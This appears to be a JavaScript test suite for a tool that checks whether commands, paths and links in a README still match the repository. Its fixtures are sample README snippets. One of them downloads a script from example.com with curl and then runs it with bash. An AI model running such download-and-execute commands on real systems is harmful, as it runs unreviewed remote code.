    expect(el.querySelector("[data-drift] code").innerHTML).toContain("&lt;");
    el.configure({
      draft: { id: "doc-1", markdown: "" },
      target: null,
      snapshots: undefined,
    });
    expect(el.querySelector("[data-drift-run]")).toBeNull();
  });
});

// Review findings for v1.6.1: each case below was once reported as an
// observed mismatch (or missed) although the repository did not contradict
// the claim.
describe("drift false positives", () => {
  const statuses = (result) =>
    result.results.map((item) => [item.text, item.status]);

  it("resolves extensionless Node entry points and folders like Node does", () => {
    const listing = listingOf([
      ["package.json"],
      ["server.js"],
      ["scripts", "tree"],
      ["scripts/seed.mjs"],
      ["api", "tree"],
      ["api/index.js"],
      ["cli.ts"],
    ]);
    const result = check(
      fence(
        "bash",
        "node server",
        "node scripts/seed",
        "node api",
        "tsx cli",
        "node missing",
        "python server",
      ),
      evidence({ listing }),
    );
    expect(status(result, "node server")).toEqual(["matches"]);
    expect(one(result, "node server").message).toBe("server.js exists.");
    expect(status(result, "node scripts/seed")).toEqual(["matches"]);
    expect(status(result, "node api")).toEqual(["matches"]);
    expect(status(result, "tsx cli")).toEqual(["matches"]);
    // Nothing Node could resolve: still an observed mismatch.
    expect(one(result, "node missing").status).toBe("mismatch");
    expect(one(result, "node missing").message).toContain(
      "No file with a Node.js extension",
    );
    // Python does not add extensions.
    expect(status(result, "python server")).toEqual(["mismatch"]);
  });

  it("skips interpreter option values and subcommands instead of reading them as files", () => {
    const lines = [
      "node -r dotenv/config scripts/setup.js",
      "node --require=dotenv/config scripts/setup.js",
      "node --import tsx scripts/setup.js",
      "tsx watch scripts/setup.js",
      "python -X dev scripts/setup.js",
      "python -W ignore scripts/setup.js",
      "php -S localhost:8000 -t public",
      "deno run npm:vite",
      "deno run --allow-net --config deno.json scripts/setup.js",
      "node -p process.version",
      "bash -o pipefail scripts/setup.js",
    ];
    expect(kinds(fence("bash", ...lines))).toEqual(
      Array(8).fill("path:scripts/setup.js"),
    );
    const result = check(fence("bash", ...lines));
    expect(result.counts.mismatch).toBe(0);
    // A file after the option values is still checked.
    expect(
      status(
        check(fence("bash", "node -r dotenv/config scripts/gone.js")),
        "node -r dotenv/config scripts/gone.js",
      ),
    ).toEqual(["mismatch"]);
    // An option that is not known to take no value may have consumed the
    // word, so a missing "file" is only uncertain.
    const unknownFlag = one(
      check(fence("bash", "python -Z thing scripts/setup.js")),
      "python -Z thing scripts/setup.js",
    );
    expect(unknownFlag.status).toBe("uncertain");
    expect(unknownFlag.message).toContain("An option before it");
  });

  it("does not need project files for version and help commands", () => {
    const listing = listingOf([["package.json"], ["package-lock.json"]]);
    const result = check(
      fence(
        "bash",
        "cargo --version",
        "cargo -V",
        "make --version",
        "make -v",
        "docker compose version",
        "docker-compose --version",
        "yarn --version",
        "make build",
      ),
      evidence({ listing }),
    );
    expect(statuses(result)).toEqual([["make build", "mismatch"]]);
  });

  it("keeps files that earlier unmodelled commands may create uncertain", () => {
    const result = check(
      fence(
        "bash",
        "python3 -m venv env",
        "source env/bin/activate",
        "go build -o bin/server ./cmd/server",
        "./bin/server",
        "gcc main.c -o hello && ./hello",
        "curl -LO https://example.com/get/install.sh",
        "bash install.sh",
        "ls scripts",
        "node scripts/gone.js",
      ),
    );
    for (const text of [
      "source env/bin/activate",
      "./bin/server",
      "gcc main.c -o hello && ./hello",
      "bash install.sh",
    ]) {
      expect(status(result, text), text).toEqual(["uncertain"]);
      expect(one(result, text).message).toContain("An earlier command");
    }
    // A mentioned folder that is already in the tree was not created by the
    // command, so a missing file inside it is still a mismatch.
    expect(status(result, "node scripts/gone.js")).toEqual(["mismatch"]);
  });

  it("reports commands inside a Git submodule as unknown", () => {
    const listing = listingOf([
      ["vendor", "tree"],
      ["vendor/lib", "commit"],
    ]);
    const result = check(
      [
        fence("bash", "git submodule update --init", "bash vendor/lib/run.sh"),
        "[docs](vendor/lib/README.md)",
      ].join("\n\n"),
      evidence({ listing }),
    );
    expect(statuses(result)).toEqual([
      ["bash vendor/lib/run.sh", "unknown"],
      ["vendor/lib/README.md", "unknown"],
    ]);
    expect(result.results[0].message).toContain("Git submodule vendor/lib");
  });

  it("does not treat a clone of another repository as this repository's root", () => {
    const result = check(
      fence(
        "bash",
        "git clone https://github.com/vendor/libfoo.git",
        "cd libfoo",
        "./bootstrap.sh",
        "make",
      ),
    );
    expect(statuses(result)).toEqual([
      ["./bootstrap.sh", "unknown"],
      ["make", "unknown"],
    ]);
    // A clone of this repository, or a fork with the same name, stays at
    // the root.
    for (const url of [
      "https://github.com/example/widget.git",
      "git@github.com:someone/widget.git",
    ]) {
      const own = check(
        fence("bash", `git clone ${url}`, "cd widget", "node scripts/gone.js"),
      );
      expect(status(own, "node scripts/gone.js"), url).toEqual(["mismatch"]);
    }
    const renamed = check(
      fence(
        "bash",
        "git clone https://github.com/example/widget.git app",
        "cd app",
        "node scripts/setup.js",
      ),
    );
    expect(status(renamed, "node scripts/setup.js")).toEqual(["matches"]);
  });

  it("ignores npm's echoed script lines in console sessions", () => {
    const markdown = fence(
      "console",
      "$ npm run build",
      "",
      "> widget@1.0.0 build",
      "> node scripts/build.js",
    );
    expect(kinds(markdown)).toEqual(["npm:build"]);
  });

  it("only joins lines on the continuation character of the fence's shell", () => {
    expect(
      kinds(fence("bash", "export V=`git describe`", "npm run lint")),
    ).toEqual(["env:V", "npm:lint"]);
    expect(
      kinds(fence("powershell", "node `", "  scripts/setup.js", "npm test")),
    ).toEqual(["path:scripts/setup.js", "npm:test"]);
    expect(
      kinds(fence("cmd", "node ^", "  scripts/setup.js", "npm test")),
    ).toEqual(["path:scripts/setup.js", "npm:test"]);
  });

  it("checks absolute links to this document against the local Markdown", () => {
    const self = "https://github.com/example/widget/blob/main/README.md";
    const markdown = `## Install\n\n[a](${self}#install) [b](${self}#removed) [c](${self})\n`;
    expect(kinds(markdown)).toEqual(["#install", "#removed"]);
    const result = evaluateDrift(plan(markdown), null);
    expect(statuses(result)).toEqual([
      [`${self}#removed`, "mismatch"],
      [`${self}#install`, "matches"],
    ]);
    // Nothing needs to be read from GitHub for them.
    expect(needsGitHub(plan(markdown))).toBe(false);
  });

  it("keeps links that may name a longer branch uncertain", () => {
    const destination = { ...target, branch: "release" };
    const base = "https://github.com/example/widget";
    const markdown = [
      `[a](${base}/blob/release/1.0/README.md)`,
      `[b](${base}/blob/release/docs/gone.md)`,
      `[c](${base}/tree/release/2.0)`,
      `[d](${base}/blob/release/GONE.md)`,
    ].join("\n");
    const result = evaluateDrift(plan(markdown, destination), evidence());
    expect(statuses(result)).toEqual([
      [`${base}/blob/release/docs/gone.md`, "mismatch"],
      [`${base}/blob/release/GONE.md`, "mismatch"],
      [`${base}/blob/release/1.0/README.md`, "uncertain"],
      [`${base}/tree/release/2.0`, "uncertain"],
    ]);
    expect(result.results[2].message).toContain("release/1.0");
  });

  it("reads anchors from BOM-prefixed files, ignores commented-out anchors and decodes entities", async () => {
    const guide = '﻿# Intro\n\n## Q&amp;A\n\n<!-- <a name="old"></a> -->\n';
    expect(markdownAnchors(guide)).toEqual(["intro", "qa"]);
    expect(envKeys("﻿API_URL=\n")).toEqual(["API_URL"]);
    // Through the real reader: GitHub returns the BOM bytes.
    const { client } = github({
      tree: treeOf([
        ["docs", "tree", "7"],
        ["docs/guide.md", "blob", "8"],
      ]),
      blobs: { [sha("8")]: blob(guide) },
    });
    const markdown =
      "[a](docs/guide.md#intro) [b](docs/guide.md#qa) [c](docs/guide.md#old)\n\n## Q&amp;A\n\n[d](#qa)\n";
    const drift = plan(markdown);
    const read = await readDriftEvidence({ client, target, plan: drift });
    expect(read.files.get("docs/guide.md").text.charCodeAt(0)).toBe(0xfeff);
    expect(statuses(evaluateDrift(drift, read))).toEqual([
      ["docs/guide.md#old", "mismatch"],
      ["docs/guide.md#intro", "matches"],
      ["docs/guide.md#qa", "matches"],
      ["#qa", "matches"],
    ]);
  });

  it("puts fenced commands in list items on their own lines", () => {
    const markdown = [
      "1. Run npm install first, then:",
      "",
      "   ```bash",
      "   npm install",
      "   npm run lint",
      "   ```",
      "",
      "   Then npm run lint again:",
      "",
      "   ```bash",
      "   npm run lint",
      "   ```",
    ].join("\n");
    expect(plan(markdown).claims.map((claim) => claim.line)).toEqual([
      4, 5, 11,
    ]);
  });

  it("parses each linked Markdown file once, however many anchors point into it", () => {
    const headings = Array.from(
      { length: 300 },
      (_, n) => `## Heading ${n}\n\nText.\n`,
    ).join("\n");
    const markdown = Array.from(
      { length: CLAIM_LIMIT },
      (_, n) => `[h${n}](docs/usage.md#heading-${n})`,
    ).join("\n");
    const drift = plan(markdown);
    const lexer = vi.spyOn(marked, "lexer");
    try {
      const result = evaluateDrift(
        drift,
        evidence({
          files: { "docs/usage.md": { status: "read", text: headings } },
        }),
      );
      expect(result.counts.matches).toBe(CLAIM_LIMIT);
      expect(lexer).toHaveBeenCalledTimes(1);
    } finally {
      lexer.mockRestore();
    }
  });
});

describe("drift false positives, round 2", () => {
  const statuses = (result) =>
    result.results.map((item) => [item.text, item.status]);
  const tree = (...entries) =>
    evidence({
      listing: listingOf(
        entries.map((path) =>
          path.endsWith("/") ? [path.slice(0, -1), "tree"] : [path],
        ),
      ),
    });

  it("gives raw HTML headings anchors, as GitHub does", () => {
    expect(
      markdownAnchors(
        '<h1 align="center">My Project</h1>\n\n<h2>Getting Started</h2>\n\n## Getting Started\n\n<h3 align="center">\n  <img src="logo.png"><br>\n  Q&amp;A <code>v2</code>\n</h3>\n',
      ),
    ).toEqual(["my-project", "getting-started", "getting-started-1", "qa-v2"]);
    const markdown =
      '<h1 align="center">My Project</h1>\n\n- [Start](#getting-started)\n\n<h2>Getting Started</h2>\n\nText\n\n[top](#my-project) [gone](#gone) [guide](docs/usage.md#setup)\n';
    const result = evaluateDrift(
      plan(markdown),
      evidence({
        files: {
          "docs/usage.md": {
            status: "read",
            text: '<h2 align="center">Setup</h2>\n\n## Usage\n',
          },
        },
      }),
    );
    expect(statuses(result)).toEqual([
      ["#gone", "mismatch"],
      ["#getting-started", "matches"],
      ["#my-project", "matches"],
      ["docs/usage.md#setup", "matches"],
    ]);
  });

  it("keeps executables that earlier build, unpack or setup steps may produce uncertain", () => {
    const listing = tree(
      "package.json",
      "package-lock.json",
      "Makefile",
      "Cargo.toml",
      "autogen.sh",
      "requirements.txt",
      "src/",
      "src/main.c",
    );
    for (const markdown of [
      fence("sh", "./autogen.sh", "./configure", "make"),
      fence("sh", "make", "./widget --help"),
      fence("sh", "unzip release.zip", "./widget"),
      [
        fence("sh", "python3 -m venv env"),
        "Then",
        fence(
          "sh",
          "source env/bin/activate",
          "pip install -r requirements.txt",
        ),
      ].join("\n\n"),
      [fence("sh", "cargo build --release"), fence("sh", "./widget")].join(
        "\n\n",
      ),
    ]) {
      const result = check(markdown, listing);
      expect(result.counts.mismatch, markdown).toBe(0);
      expect(result.counts.uncertain, markdown).toBe(1);
      expect(result.results[0].message, markdown).toMatch(/earlier command/i);
    }
    // Without a build step, a missing script is still an observed mismatch.
    expect(
      statuses(
        check(
          fence(
            "sh",
            "git clone https://github.com/example/widget.git",
            "cd widget",
            "./install.sh",
            "python app.py",
          ),
          listing,
        ),
      ),
    ).toEqual([
      ["./install.sh", "mismatch"],
      ["python app.py", "mismatch"],
    ]);
    // A build step does not make a missing source file uncertain.
    expect(
      status(
        check(fence("sh", "make", "python app.py"), listing),
        "python app.py",
      ),
    ).toEqual(["mismatch"]);
  });

  it("treats build output folders themselves as generated", () => {
    const listing = tree("package.json", "package-lock.json", "src/");
    const result = check(
      fence(
        "bash",
        "npm run build",
        "cp -r dist /var/www/html",
        "node build",
        "node dist",
        "chmod +x build",
      ),
      listing,
    );
    for (const text of [
      "cp -r dist /var/www/html",
      "node build",
      "node dist",
      "chmod +x build",
    ]) {
      expect(status(result, text), text).toEqual(["uncertain"]);
      expect(one(result, text).message).toContain("builds or installs");
    }
  });

  it("treats cd into the repository's name as ambiguous when the tree has that folder", () => {
    const listing = tree("widget/", "widget/manage.py", "widget/server.js");
    const result = check(
      fence(
        "bash",
        "cd widget",
        "python manage.py runserver",
        "node server.js",
        "node gone.js",
      ),
      listing,
    );
    expect(statuses(result)).toEqual([
      ["node gone.js", "uncertain"],
      ["python manage.py runserver", "matches"],
      ["node server.js", "matches"],
    ]);
    // After an explicit clone, a second `cd widget` enters the folder.
    const cloned = check(
      fence(
        "bash",
        "git clone https://github.com/example/widget.git",
        "cd widget",
        "cd widget",
        "node gone.js",
      ),
      listing,
    );
    expect(statuses(cloned)).toEqual([["node gone.js", "mismatch"]]);
    expect(cloned.results[0].message).toContain("widget/gone.js");
  });

  it("follows pushd, popd and subshells, and skips heredoc bodies", () => {
    const listing = tree("docs/", "docs/server.js", "server.js");
    const result = check(
      [
        fence("bash", "pushd docs", "node server.js", "popd", "node server.js"),
        fence("bash", "(cd docs && node server.js)", "node server.js"),
        fence("bash", "cat <<'EOF' > run.sh", "node tools/missing.js", "EOF"),
        fence("bash", "echo $(git describe --tags)"),
        fence(
          "powershell",
          "$script = @'",
          "node tools/missing.js",
          "'@",
          "node server.js",
        ),
      ].join("\n\n"),
      listing,
    );
    expect(result.counts.mismatch).toBe(0);
    expect(result.results.every((item) => item.status === "matches")).toBe(
      true,
    );
    expect(result.results.map((item) => item.text)).toEqual([
      "node server.js",
      "node server.js",
      "(cd docs && node server.js)",
      "node server.js",
      "node server.js",
    ]);
  });

  it("does not read assignments or prose that starts with an interpreter name as commands", () => {
    const markdown = [
      fence("", "[tool.poetry.dependencies]", 'python = "^3.9"'),
      fence("", "source code lives in src/", "node is required"),
      fence("bash", "python = 3.11", "python: 3.11"),
      fence("", "python scripts/gone.py"),
    ].join("\n\n");
    expect(kinds(markdown)).toEqual(["path:scripts/gone.py"]);
  });

  it("does not treat a missing committed .env template as a locally ignored file", () => {
    const listing = tree(".env.sample");
    const result = check(
      [
        fence("bash", "cp .env.example .env", "cat .env.local"),
        "[t](.env.example)",
      ].join("\n\n"),
      listing,
    );
    expect(status(result, "cp .env.example .env")).toEqual(["mismatch"]);
    expect(status(result, ".env.example")).toEqual(["mismatch"]);
    expect(status(result, "cat .env.local")).toEqual([]);
    expect(
      one(
        check(fence("bash", "source .env.local"), listing),
        "source .env.local",
      ).status,
    ).toBe("uncertain");
  });
});

describe("drift false positives, round 3", () => {
  const statuses = (result) =>
    result.results.map((item) => [item.text, item.status]);
  const tree = (...entries) =>
    evidence({
      listing: listingOf(
        entries.map((path) =>
          path.endsWith("/") ? [path.slice(0, -1), "tree"] : [path],
        ),
      ),
    });
  const withScripts = (scripts, ...entries) => ({
    ...tree("package.json", ...entries),
    files: new Map([
      ["package.json", { status: "read", text: JSON.stringify({ scripts }) }],
    ]),
  });

  it("treats GitHub footnotes as footnotes, not link references", () => {
    for (const definition of [
      "[^1]: Benchmarks.",
      "[^node]: Tested",
      "[^2]: Deprecated",
      '[^1]: "quoted"',
      "  [^1]: Benchmarks.",
    ]) {
      const label = definition.match(/\[(\^[^\]]+)\]/)[1];
      const markdown = `Fast[${label}].\n\n${definition}\n`;
      expect(plan(markdown).claims, definition).toEqual([]);
      expect(plan(markdown).notes, definition).toEqual([]);
    }
    // Ordinary reference links are still checked, on their definition's
    // line, where the URL is written (and a fix would go).
    const markdown =
      "Fast[^1]. See [the guide][g].\n\n[^1]: Benchmarks.\n[g]: docs/gone.md\n";
    expect(kinds(markdown)).toEqual(["link:docs/gone.md"]);
    expect(plan(markdown).claims[0].line).toBe(4);
    expect(plan(markdown).claims[0].unlocated).toBeUndefined();
    // Later claims keep their lines and text.
    const after = plan(
      "[^1]: Benchmarks.\n\n```bash\nnpm run lint\n```\n\n[g](docs/gone.md)\n",
    ).claims.map((claim) => [claim.text, claim.line]);
    expect(after).toEqual([
      ["npm run lint", 4],
      ["docs/gone.md", 7],
    ]);
  });

  it("knows that configure and CMake generate the Makefile that make reads", () => {
    const listing = tree(
      "README.md",
      "configure",
      "Makefile.in",
      "Makefile.am",
      "CMakeLists.txt",
      "autogen.sh",
    );
    for (const markdown of [
      fence("bash", "./configure", "make", "sudo make install"),
      fence("bash", "./autogen.sh && ./configure && make"),
      fence("sh", "cmake .", "make"),
      [fence("sh", "./configure --prefix=/usr"), fence("sh", "make")].join(
        "\n\n",
      ),
    ]) {
      const result = check(markdown, listing);
      expect(result.counts.mismatch, markdown).toBe(0);
      const make = result.results.filter((r) => /^make needs/.test(r.message));
      expect(make.length, markdown).toBeGreaterThan(0);
      for (const item of make)
        expect(item.message, markdown).toMatch(
          /earlier command \((?:\.\/configure|cmake)\)/,
        );
    }
    // Without a generator, a missing Makefile is still observed.
    for (const markdown of [
      fence("sh", "make"),
      fence("sh", "npm install", "make"),
    ])
      expect(status(check(markdown, listing), "make"), markdown).toEqual([
        "mismatch",
      ]);
  });

  it("reads node --run as a package.json script and skips node inspect", () => {
    expect(kinds(fence("bash", "node --run dev", "node --run=build"))).toEqual([
      "node:dev",
      "node:build",
    ]);
    const read = withScripts({ dev: "vite" }, "server.js");
    expect(
      statuses(
        check(
          fence(
            "bash",
            "node --run dev",
            "node --run lint",
            "node inspect server.js",
          ),
          read,
        ),
      ),
    ).toEqual([
      ["node --run lint", "mismatch"],
      ["node --run dev", "matches"],
      ["node inspect server.js", "matches"],
    ]);
  });

  it("strips continuation prompts from continued lines of prompted commands", () => {
    const listing = tree(
      "package.json",
      "package-lock.json",
      "deploy/",
      "deploy/compose.yml",
    );
    expect(
      statuses(
        check(
          fence(
            "console",
            "$ docker compose \\",
            ">   -f deploy/compose.yml up",
          ),
          listing,
        ),
      ),
    ).toEqual([["docker compose  -f deploy/compose.yml up", "matches"]]);
    expect(
      kinds(fence("console", "$ python \\", ">   -m http.server")),
    ).toEqual([]);
    expect(kinds(fence("console", "$ npm run \\", "> build"))).toEqual([
      "npm:build",
    ]);
    expect(kinds(fence("bash", "$ npm run \\", "> build"))).toEqual([
      "npm:build",
    ]);
    expect(kinds(fence("powershell", "PS> npm run `", ">> build"))).toEqual([
      "npm:build",
    ]);
    // Without a prompt, a continued line's `>` is a real redirect.
    expect(
      kinds(fence("bash", "node scripts/report.js \\", "> report.txt")),
    ).toEqual(["path:scripts/report.js"]);
  });

  it("reports a Node version statement once, on its own line", () => {
    const lines = (markdown) =>
      plan(markdown).claims.map((claim) => [
        claim.kind,
        claim.line,
        claim.major,
      ]);
    expect(
      lines("## Requirements\n\nThis project needs\nNode 18 or later.\n"),
    ).toEqual([["node", 4, 18]]);
    expect(lines("- item\n- requires Node 16 at least\n")).toEqual([
      ["node", 2, 16],
    ]);
    expect(lines("Needs\nmore\nNode 18+ and later Node 18+ again\n")).toEqual([
      ["node", 3, 18],
    ]);
  });

  it("treats links to the repository root as the repository page", () => {
    for (const markdown of ["[home](./)", "[x](.)", "[y](/)"]) {
      expect(plan(markdown).claims, markdown).toEqual([]);
      expect(plan(markdown).notes, markdown).toEqual([]);
    }
    const markdown = "[top](./#install) [gone](./#missing)\n\n## Install\n";
    expect(plan(markdown).notes).toEqual([]);
    expect(statuses(evaluateDrift(plan(markdown), null))).toEqual([
      ["./#missing", "mismatch"],
      ["./#install", "matches"],
    ]);
    // From a README in a folder, the root page shows another README.
    const nested = { ...target, path: "docs/README.md" };
    expect(plan("[top](../#install)", nested).claims).toEqual([]);
    expect(plan("[top](../#install)", nested).notes).toEqual([]);
    expect(kinds("[here](./)", nested)).toEqual(["link:docs"]);
    // Undecodable links are still counted.
    expect(plan("[bad](%E0%A4%A.md)").notes).toEqual([
      "1 relative link(s) could not be decoded.",
    ]);
  });

  it("checks heading anchors that only look like line anchors", () => {
    const markdown =
      "## L10n setup\n\n[x](#l10n-setup) [y](#l10n-missing) [z](#L10) [w](#L10-L20) [v](#L3C2-L4C1)\n";
    expect(statuses(evaluateDrift(plan(markdown), null))).toEqual([
      ["#l10n-missing", "mismatch"],
      ["#l10n-setup", "matches"],
    ]);
    const result = check(
      "[a](docs/usage.md#l10n-missing) [b](docs/usage.md#L12) [c](docs/usage.md#l12)",
    );
    expect(statuses(result)).toEqual([
      ["docs/usage.md#l10n-missing", "mismatch"],
      ["docs/usage.md#L12", "matches"],
      ["docs/usage.md#l12", "matches"],
    ]);
  });

  it("does not read an upper bound as a minimum Node version", () => {
    expect(minimumMajor("<=20")).toBe(null);
    expect(minimumMajor("<20")).toBe(null);
    expect(minimumMajor(">=18 <=22")).toBe(18);
    const read = {
      ...tree("package.json"),
      files: new Map([
        [
          "package.json",
          {
            status: "read",
            text: JSON.stringify({ engines: { node: "<=20" } }),
          },
        ],
      ]),
    };
    const result = check("Requires Node 18 or later.", read);
    expect(result.counts.uncertain).toBe(0);
    expect(result.results[0].status).toBe("unknown");
  });

  it("does not compare shell setup variables with the .env example", () => {
    expect(
      kinds(
        [
          fence(
            "bash",
            'export PATH="$HOME/bin:$PATH"',
            "export JAVA_HOME=/opt/java",
            "export NODE_OPTIONS=--max-old-space-size=4096",
            "export API_URL=https://example.com",
          ),
          fence("env", "PATH=/usr/bin", "TOKEN=x"),
        ].join("\n\n"),
      ),
    ).toEqual(["env:API_URL", "env:TOKEN"]);
  });
});
